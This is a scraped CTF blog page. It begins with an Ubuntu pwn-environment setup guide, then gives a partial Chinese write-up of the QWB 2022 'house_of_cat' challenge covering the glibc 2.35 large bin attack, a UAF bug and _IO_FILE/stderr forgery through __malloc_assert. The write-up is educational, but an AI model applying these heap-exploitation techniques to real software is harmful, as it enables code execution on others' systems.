<p><img src="https://img-blog.csdnimg.cn/089f64591a3f44b4b89500994bc8cfbc.png"><br>网络选择。这个网络的选择可以在虚拟机创建之后随时修改，这里简单介绍一下最常用的前两种：<strong>桥接网络和NAT</strong>。桥接网络如上面所说，直接访问外部以太网，前提是虚拟机要有自己的IP地址，因此桥接网络在使用的时候大多都是勾选“与主机共用IP地址”这个选项（这个选项在创建虚拟机到这一步的时候没有显示，但是可以在上方工具栏<strong>虚拟机-&gt;设置</strong>中找到并勾选，后面再说）。某些学校的校园网可能有接入设备数量限制（笔者学校就是），这个时候虚拟机选择桥接网络可能无法联网，可以考虑使用NAT模式，在这个模式下，主机相当于一个网关，而虚拟机为网关下的机器，与外部以太网连接需要借助主机。这种模式可以有效克服上面说的校园网接入数量限制问题。<br>因此这里选择默认NAT，<strong>最好能够保证开机之后立刻联网</strong>呃，因为需要下载一些包，安装完成之后也能改。以默认NAT进行下一步。</p>
<p><img src="https://img-blog.csdnimg.cn/36d4869449b84b94aa7fa2f406eb89a4.png"><br>IO控制器类型，不用改直接下一步。</p>
<p><img src="https://img-blog.csdnimg.cn/f9be0b0f51be4b2caa1999af5c1e23d0.png"><br>磁盘类型也不用改，直接下一步。</p>
<p><img src="https://img-blog.csdnimg.cn/63db1daec903499a9a9fc6a732cd22cf.png"><br>磁盘类型不用改，下一步。</p>
<p><img src="https://img-blog.csdnimg.cn/829ad28e615a47078c51ee00902065c0.png"><br>磁盘空间设置这里，除了最大磁盘大小之外其他都不要改。为了避免出现磁盘空间不足的问题，笔者这里设置为200GB。这个大小根据自己的物理磁盘空间决定，但是不要太小，<strong>建议pwner们不要小于60GB</strong>，后面做kernel pwn搭建环境可能很占空间的。</p>
<p><img src="https://img-blog.csdnimg.cn/dc5e00ac7bee40999ce223c0800a783b.png"><br>磁盘文件，不用改直接下一步。</p>
<p><img src="https://img-blog.csdnimg.cn/0adc1d23dbc444cb9a227d560637cce3.png"><br>上面是最后确认的界面，确定好虚拟机的配置后，点击完成就可以开始创建虚拟机了。</p>
<p><img src="https://img-blog.csdnimg.cn/0b22f4d4bfbb424996917c500c5e425d.png"><br>之后是自动开机安装过程，耐心等待一段时间……</p>
<p><img src="https://img-blog.csdnimg.cn/24d1b1c99b45470eb055da0258e3754f.png"><br>大约10分钟之后，我们就能够登录ubuntu系统了。</p>
<p><img src="https://img-blog.csdnimg.cn/e6147fd6490848d3b412eafc799b43d8.png"><br>在笔者的vmware中，linux系统在安装的时候就已经安装了VMware Tools，它能够帮助你更加快捷地在主机和虚拟机中传递文件，只需拖动即可。但是笔者的虚拟机只能从打开的文件夹中拖动文件到主机，不能从桌面上直接拖动复制，从主机复制文件到虚拟机也是必须复制到打开的文件夹中。</p>
<p>自此，我们的ubuntu系统就成功搭建好了，下面进行一些配置使虚拟机能够更加轻松方便地使用。</p>
<h2 id="2-默认root权限设置"><a href="#2-默认root权限设置" class="headerlink" title="2. 默认root权限设置"></a>2. 默认root权限设置</h2><p>在做题的时候，如果我们能够直接以root的身份登录，就不需要输入n多次的密码了。</p>
<p>参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/willhu2008/article/details/121699938?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165499613116782184643247%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165499613116782184643247&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-4-121699938-null-null.142%5Ev13%5Econtrol,157%5Ev14%5Econtrol&utm_term=ubuntu20.04%E9%BB%98%E8%AE%A4root%E7%99%BB%E5%BD%95&spm=1018.2226.3001.4187">资料</a>进行操作即可。根据步骤来，实测有效。</p>
<p><img src="https://img-blog.csdnimg.cn/c8c04eda32054cc1a0b4c703d6a16c8d.png"><br>注意正上方的提示，重启之后我们已经成功自动以root用户登录了，完成。</p>
<h2 id="3-安装vim"><a href="#3-安装vim" class="headerlink" title="3. 安装vim"></a>3. 安装vim</h2><p><code>apt install vim</code>即可</p>
<h2 id="4-修改软件源"><a href="#4-修改软件源" class="headerlink" title="4. 修改软件源"></a>4. 修改软件源</h2><p>ubuntu自带的软件源是国外的，速度慢有的时候还连不上，于是应修改为国内的镜像。</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_37317193/article/details/121310922?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165499699616780366572573%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165499699616780366572573&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-121310922-null-null.142%5Ev13%5Econtrol,157%5Ev14%5Econtrol&utm_term=ubuntu20.04%E9%95%9C%E5%83%8F%E6%BA%90%E9%98%BF%E9%87%8C%E4%BA%91&spm=1018.2226.3001.4187">镜像与修改方法</a></p>
<p>笔者选择阿里云镜像。</p>
<p>修改完文件之后记得<code>apt update</code>和<code>apt upgrade</code>进行更新。第一次更新可能需要等一段时间，看你的网速怎么样……</p>
<h2 id="5-安装sublime-text（非必要）"><a href="#5-安装sublime-text（非必要）" class="headerlink" title="5. 安装sublime-text（非必要）"></a>5. 安装sublime-text（非必要）</h2><p>使用系统自带的gedit没有补全功能，可以在ubuntu应用商店里面搜索sublime-text安装，打开py文件的时候右键选中“Open with other application”就可以使用sublime-text打开了。（这里图标显示不出来，但是安装没有问题）</p>
<p><img src="https://img-blog.csdnimg.cn/f2016d8b64ef4c6bb096c51ed28912e2.png"></p>
<h2 id="6-安装pwntools"><a href="#6-安装pwntools" class="headerlink" title="6. 安装pwntools"></a>6. 安装pwntools</h2><p>pwntools是pwn最常用的一个python包。<br>首先需要安装pip：<code>apt install python3-pip</code><br>然后安装pwntools：<code>pip install pwntools</code><br>完成。</p>
<h2 id="7-安装pwndbg"><a href="#7-安装pwndbg" class="headerlink" title="7. 安装pwndbg"></a>7. 安装pwndbg</h2><p>pwndbg是gdb的插件，帮助我们在做题时进行调试。<br>首先安装git：<code>apt install git</code><br>然后拉取git库：<code>git clone https://github.com/pwndbg/pwndbg</code><br>进入pwndbg目录运行bash脚本<code>setup.sh</code>即开始安装</p>
<p><img src="https://img-blog.csdnimg.cn/cb873d25bd134315bbaebca8d40fcf34.png"><br>运行gdb下有pwndbg标识即表示安装成功。</p>
<h2 id="8-安装LibcSearcher"><a href="#8-安装LibcSearcher" class="headerlink" title="8. 安装LibcSearcher"></a>8. 安装LibcSearcher</h2><p>请参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40026795/article/details/107150265?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165501579816780357270501%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165501579816780357270501&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-107150265-null-null.142%5Ev13%5Econtrol,157%5Ev14%5Econtrol&utm_term=libcsearcher%E5%AE%89%E8%A3%85&spm=1018.2226.3001.4187">资料</a></p>
<p>注意不要使用<del>pip install LibcSearcher</del>，这两个是不一样的，链接中的是国人写的，准确度相对高一些。</p>
<h2 id="9-安装checksec"><a href="#9-安装checksec" class="headerlink" title="9. 安装checksec"></a>9. 安装checksec</h2><p>请参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43430261/article/details/105516051?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165501780216782248583442%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165501780216782248583442&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-105516051-null-null.142%5Ev13%5Econtrol,157%5Ev14%5Econtrol&utm_term=checksec%E5%AE%89%E8%A3%85&spm=1018.2226.3001.4187">资料</a></p>
<p><strong>到这一步完成之后，一般的pwn题就可以开始做了。如果需要kernel环境，则继续下面的步骤。</strong></p>
<h2 id="10-安装qemu"><a href="#10-安装qemu" class="headerlink" title="10. 安装qemu"></a>10. 安装qemu</h2><p>使用<code>apt list qemu*</code>可查看所有前缀为qemu的包。可以看到这里有很多支持不同架构的qemu。<br><img src="https://img-blog.csdnimg.cn/13fca94a56444dda939c9563a457da77.png"><br>根据自己的需要安装对应架构的包即可。一般最为常用的是x86架构：<code>apt install qemu-system-x86</code>，注意不能只输入<code>apt install qemu</code>。</p>
<h2 id="11-配置kernel-pwn环境"><a href="#11-配置kernel-pwn环境" class="headerlink" title="11. 配置kernel pwn环境"></a>11. 配置kernel pwn环境</h2><p>较为复杂，这里给出笔者以前写的资料。<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54218833/article/details/124360103">资料</a></p>
<h2 id="12-安装vmlinux-to-elf"><a href="#12-安装vmlinux-to-elf" class="headerlink" title="12. 安装vmlinux-to-elf"></a>12. 安装vmlinux-to-elf</h2><p>这是一个用于将bzImage解压为vmlinux的工具，在kernel pwn中经常用到：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/marin-m/vmlinux-to-elf</span><br><span class="line"><span class="built_in">cd</span> vmlinux-to-elf</span><br><span class="line">sudo python3 ./setup.py install</span><br></pre></td></tr></table></figure>
<p>然后就可以使用vmlinux-to-elf命令进行解压了。</p>
<h2 id="13-ARM-pwn环境搭建"><a href="#13-ARM-pwn环境搭建" class="headerlink" title="13. ARM pwn环境搭建"></a>13. ARM pwn环境搭建</h2><p>参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38154820/article/details/125875703?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166613948816782427428087%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=166613948816782427428087&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-125875703-null-null.142%5Ev59%5Epc_rank_34_1,201%5Ev3%5Econtrol_1&utm_term=arm%20pwn&spm=1018.2226.3001.4187">资料</a>中的做法如下：</p>
<p>虽然说在x86-64的机器上无法直接运行ARM架构的elf文件，但我们可以通过qemu来实现。虽然可以使用docker在x86-64的机器上创建一个ARM架构的docker容器，但太过麻烦，在容器中还需要安装很多东西。因此可以直接使用qemu与gdb-multiarch配合。</p>
<p>实际上qemu不仅可以用来起一个qemu容器，还可以仅仅运行一个其他架构的elf文件，可以添加选项<code>-g &lt;端口号&gt;</code>将elf程序映射到某一个端口，而且还会等待接入，只有当我们使用gdb-multiarch接入时才会开始准备执行其中的第一条指令，非常方便我们下断点。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gdb-multiarch</span><br><span class="line">sudo apt install qemu-user-static</span><br></pre></td></tr></table></figure>
<p>如果要执行的文件名为.&#x2F;pwn，则使用qemu执行该ARM可执行文件的命令为：<br><code>qemu-arm-static -g 9999 -L . ./pwn</code><br>之后启动gdb-multiarch：<br><code>gdb-multiarch ./pwn</code><br>连接端口：<br><code>pwndbg&gt; target remote 9999</code><br>即可开始调试。<br>如果想直接执行不调试，只需要删除qemu-arm-static中的-g选项即可。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/%E5%BC%BA%E7%BD%91%E6%9D%AF2022-pwn-%E8%B5%9B%E9%A2%98%E8%A7%A3%E6%9E%90%E2%80%94%E2%80%94house-of-cat/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's Pwnhome">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/%E5%BC%BA%E7%BD%91%E6%9D%AF2022-pwn-%E8%B5%9B%E9%A2%98%E8%A7%A3%E6%9E%90%E2%80%94%E2%80%94house-of-cat/" class="post-title-link" itemprop="url">强网杯2022 pwn 赛题解析——house_of_cat</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:27:11" itemprop="dateCreated datePublished" datetime="2023-02-28T22:27:11+08:00">2023-02-28</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>这道题在pwn方向是做出来的队伍最多的一道题，但由于笔者之前对于高版本glibc的_IO_FILE攻击方式不甚了解，因此比赛的时候跳过了。本文就对该题进行从原理到实战的详细分析，帮助读者理解本题使用过的攻击方式。</p>
<h1 id="house-of-cat"><a href="#house-of-cat" class="headerlink" title="house_of_cat"></a>house_of_cat</h1><p>本题使用的glibc版本是2.35，是目前ubuntu 22.04上最新的glibc版本。因此本题的调试与做题环境为：Ubuntu 22.04。</p>
<p>本题的漏洞利用方式为house of apple，这是一种基于large bin attack的_IO_FILE攻击方式。那么首先我们就需要了解large bin attack和_IO_FILE利用这两个基础知识。</p>
<h2 id="前置知识1——高版本libc的large-bin-attack"><a href="#前置知识1——高版本libc的large-bin-attack" class="headerlink" title="前置知识1——高版本libc的large bin attack"></a>前置知识1——高版本libc的large bin attack</h2><p>large bin attack从2.23版本到2.35版本，一直是一种没有被解决的利用方式，在高版本的libc中，large bin attack的具体方式与低版本区别并不大，利用原理也是相同的。不过与2.23和2.27版本不同，2.30及以上版本在_int_malloc函数中对于large bin新增了两个检查：（截图来自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54218833/article/details/124239224">这里</a>）</p>
<p><img src="https://img-blog.csdnimg.cn/f306185344b9466dbef35195e70157d7.png"><br>下面我们通过how2heap简单看一下2.35版本的large bin attack是如何实现的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">Since glibc2.30, two new checks have been enforced on large bin chunk insertion</span><br><span class="line"></span><br><span class="line">Check 1 : </span><br><span class="line">&gt;    if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">&gt;        malloc_printerr (&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;);</span><br><span class="line">Check 2 : </span><br><span class="line">&gt;    if (bck-&gt;fd != fwd)</span><br><span class="line">&gt;        malloc_printerr (&quot;malloc(): largebin double linked list corrupted (bk)&quot;);</span><br><span class="line"></span><br><span class="line">This prevents the traditional large bin attack</span><br><span class="line">However, there is still one possible path to trigger large bin attack. The PoC is shown below : </span><br><span class="line"></span><br><span class="line">====================================================================</span><br><span class="line"></span><br><span class="line">Here is the target we want to overwrite (0x7ffc96dca630) : 0</span><br><span class="line"></span><br><span class="line">First, we allocate a large chunk [p1] (0x564fd9bdc290)</span><br><span class="line">And another chunk to prevent consolidate</span><br><span class="line"></span><br><span class="line">We also allocate a second large chunk [p2]  (0x564fd9bdc6e0).</span><br><span class="line">This chunk should be smaller than [p1] and belong to the same large bin.</span><br><span class="line">Once again, allocate a guard chunk to prevent consolidate</span><br><span class="line"></span><br><span class="line">Free the larger of the two --&gt; [p1] (0x564fd9bdc290)</span><br><span class="line">Allocate a chunk larger than [p1] to insert [p1] into large bin</span><br><span class="line"></span><br><span class="line">Free the smaller of the two --&gt; [p2] (0x564fd9bdc6e0)</span><br><span class="line">At this point, we have one chunk in large bin [p1] (0x564fd9bdc290),</span><br><span class="line">               and one chunk in unsorted bin [p2] (0x564fd9bdc6e0)</span><br><span class="line"></span><br><span class="line">Now modify the p1-&gt;bk_nextsize to [target-0x20] (0x7ffc96dca610)</span><br><span class="line"></span><br><span class="line">Finally, allocate another chunk larger than [p2] (0x564fd9bdc6e0) to place [p2] (0x564fd9bdc6e0) into large bin</span><br><span class="line">Since glibc does not check chunk-&gt;bk_nextsize if the new inserted chunk is smaller than smallest,</span><br><span class="line">  the modified p1-&gt;bk_nextsize does not trigger any error</span><br><span class="line">Upon inserting [p2] (0x564fd9bdc6e0) into largebin, [p1](0x564fd9bdc290)-&gt;bk_nextsize-&gt;fd-&gt;nexsize is overwritten to address of [p2] (0x564fd9bdc6e0)</span><br><span class="line"></span><br><span class="line">In out case here, target is now overwritten to address of [p2] (0x564fd9bdc6e0), [target] (0x564fd9bdc6e0)</span><br><span class="line">Target (0x7ffc96dca630) : 0x564fd9bdc6e0</span><br><span class="line"></span><br><span class="line">====================================================================</span><br></pre></td></tr></table></figure>
<p>以上就是程序的输出结果。可以看到其利用的方式非常简单，前提条件是：</p>
<ol>
<li>large bin中有1个chunk，unsorted bin中有一个chunk（如果被链入到large bin中需要与前面的chunk链到一个bin中），且large bin中的比unsorted bin中的大。</li>
<li>可以修改large bin中chunk的bk_nextsize指针。</li>
</ol>
<p>当我们分配一个大chunk使得unsorted bin中的chunk被链入到large bin时，由于原先的large bin chunk比这个chunk大，所以居于其后（对large bin链入过程不清楚的读者可以先看<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54218833/article/details/123588647">这里</a>），这就绕过了添加的两个检查，能够成功将原large bin chunk中的bk_nextsize-&gt;fd_nextsize修改为新链入的chunk地址，即实现了<strong>任一地址写一个堆地址</strong>。</p>
<h2 id="前置知识2——-IO-FILE"><a href="#前置知识2——-IO-FILE" class="headerlink" title="前置知识2——_IO_FILE"></a>前置知识2——_IO_FILE</h2><p>在之前的<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54218833/article/details/122897689">文章</a>中分析过，这里就不费笔墨了。在<a target="_blank" rel="noopener" href="https://blog.csdn.net/pythonxxoo/article/details/125342417?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165942247416780366567102%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165942247416780366567102&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-125342417-null-null.142%5Ev38%5Econtrol&utm_term=house%20of%20apple&spm=1018.2226.3001.4187">这篇文章</a>中也有简要的介绍。</p>
<hr>
<p>既然large bin attack可以实现任意地址写，如果我们将_IO_list_all的值修改为一个堆地址，那我们岂不是可以控制_IO_FILE结构体的执行流了吗？现在，我们就回到这道题本身来进行分析。</p>
<h2 id="Step-1-逆向分析"><a href="#Step-1-逆向分析" class="headerlink" title="Step 1: 逆向分析"></a>Step 1: 逆向分析</h2><p><img src="https://img-blog.csdnimg.cn/b663e0a308e9423ebb92d74dc8e39a08.png"><br>这道题的漏洞很好找，就在delete_cat这个函数中，删除操作中的free并未清空指针，因此有UAF漏洞。不过在能够操作菜单之前，我们还需要进行登录操作。这一部分的分析不难，按照函数的执行流程进行分析调试就能够获取到成功登录的字符串输入格式。最终通过login函数成功登录的字符串为：<code>LOGIN | r00t QWB QWXFadmin\x00</code></p>
<p><img src="https://img-blog.csdnimg.cn/ceb58e3f98f5496eaa2d0e2d7b4f6f8f.png"><br>在进入菜单之后，我们还需要通过某些检查。这些检查也不难通过，输入字符串为：<code>CAT | r00t QWB QWXF\xFF$</code></p>
<p><img src="https://img-blog.csdnimg.cn/1ee4d91fb8d34627967693775a2f97d4.png"><br>重点就在于菜单的四种操作。添加是正常的添加操作，只不过每一次添加的chunk可写部分大小必须在0x418到0x470之间，这是属于large bin的范围，因此本题和tcache无关。</p>
<p><img src="https://img-blog.csdnimg.cn/60ac2427148f4cf0a6aa505e7ddf309e.png"><br>然后是编辑功能，每一次只能编辑chunk可写部分的前30个字节而不能控制所有字节。</p>
<p><img src="https://img-blog.csdnimg.cn/08ef631678f44b3296a38ff369b60c3a.png"><br>show与edit相同，也是只能展示前30字节。</p>
<p><img src="https://img-blog.csdnimg.cn/5fd1b455eee649ac995605c84a0df23a.png"><br>由于本题中的delete函数有UAF漏洞，因此我们只要show一个free chunk就能够轻松获取到libc和堆地址。因此进行一次large bin attack并不是什么难事。但关键在于，我们应该如何构造假的_IO_FILE结构体。注意，本题中使用了沙箱，我们不能直接调用system函数getshell，因此还需要借用setcontext函数。</p>
<h2 id="Step-2-漏洞分析"><a href="#Step-2-漏洞分析" class="headerlink" title="Step 2: 漏洞分析"></a>Step 2: 漏洞分析</h2><p>本文主要参考Nu1L师傅的wp进行分析。其使用了<code>__malloc_assert</code>函数作为跳板进行漏洞利用。首先我们需要知道这个函数在何处被调用。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// malloc.c line 292</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> __assert_fail(assertion, file, <span class="keyword">line</span>, function)			\</span></span><br><span class="line"><span class="meta">	 __malloc_assert(assertion, file, <span class="keyword">line</span>, function)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">const</span> <span class="type">char</span> *__progname;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">		 <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  (<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">		     __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     file, line,</span><br><span class="line">		     function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     assertion);</span><br><span class="line">  fflush (<span class="built_in">stderr</span>);</span><br><span class="line">  <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在malloc.c中我们可以找到，这里的<code>__assert_fail</code>就是<code>__malloc_assert</code>，即在这里调用<code>assert_fail</code>就相当于调用<code>__malloc_assert</code>。而<code>__assert_fail</code>是在<code>assert</code>函数中被调用，因此只需要找到在<code>malloc</code>函数中何处调用了<code>assert</code>函数即可。但<code>assert</code>函数调用的地方实在太多，我们应该选择哪一个呢？注意在<code>_int_malloc</code>函数中，所有针对堆的检查错误信息打印都是使用<code>malloc_printerr</code>函数而非<code>assert</code>。因此我们选择<code>_int_malloc</code>函数调用的<code>sysmalloc</code>函数。在<code>sysmalloc</code>函数中有检查是使用<code>assert</code>来实现的，而在<code>_int_malloc</code>函数中只有当完全确认释放的chunk无法满足申请需求且top chunk的大小也小于申请大小时才会调用<code>sysmalloc</code>函数。我们首先分析一下进入<code>sysmalloc</code>函数之后应该如何做才能拿到flag，至于如何调用<code>sysmalloc</code>函数，则是堆块排布方面的事情了，我们在后面也会提到。</p>
<p>在<code>sysmalloc</code>函数中，有这样一条<code>assert</code>语句：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// malloc.c line 2617</span></span><br><span class="line">  assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">          ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">           prev_inuse (old_top) &amp;&amp;</span><br><span class="line">           ((<span class="type">unsigned</span> <span class="type">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br></pre></td></tr></table></figure>

<p>这是用来检查<code>top chunk</code>的一些属性，其中注意最后一行，<code>top chunk</code>必须页对齐。如果这里的<code>top chunk</code>没有满足页对齐，那么就会调用<code>__assert_fail</code>函数，也即<code>__malloc_assert</code>函数。而在<code>__malloc_assert</code>函数中，经过调试发现，漏洞利用是发生在调用<code>__fxprintf</code>中而非<code>fflush</code>函数。这是因为当我们执行到<code>assert</code>失败时，<code>_IO_FILE</code>应该已经被我们修改，而<code>__fxprintf</code>作为一个需要将字符串输出到控制台的函数，必然会调出<code>stderr</code>文件描述符进行输出。但这个时候只有我们自己伪造的<code>_IO_FILE</code>指针，只要我们构造好假的<code>stderr</code>，就有可能实现任意代码执行。</p>
<p>笔者仔细研究了一下本题的利用思路，发现这是典型的house of emma利用方法。（<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46483787/article/details/122808870?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165951020116780357291390%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165951020116780357291390&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-122808870-null-null.142%5Ev39%5Econtrol&utm_term=house%20of%20emma&spm=1018.2226.3001.4187">资料参考</a>）</p>
<p>经过笔者多次调试跟踪，最终发现程序在<code>__vfprintf_internal+0x280</code>处调用了<code>vtable+0x38</code>处的函数，其第一个参数<code>rdi</code>指向的是伪造的<code>stderr</code>：</p>
<p><img src="https://img-blog.csdnimg.cn/6ede1d6c5e0944558285b927adb0753a.png"><br>查看vtable类型的源码声明：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>可以看到，这里本意实际是想要调用结构体中偏移为0x38的成员，即<code>_IO_xsputn_t</code>函数。<br>又找到<code>_IO_cookie_jumps</code>结构体：</p>
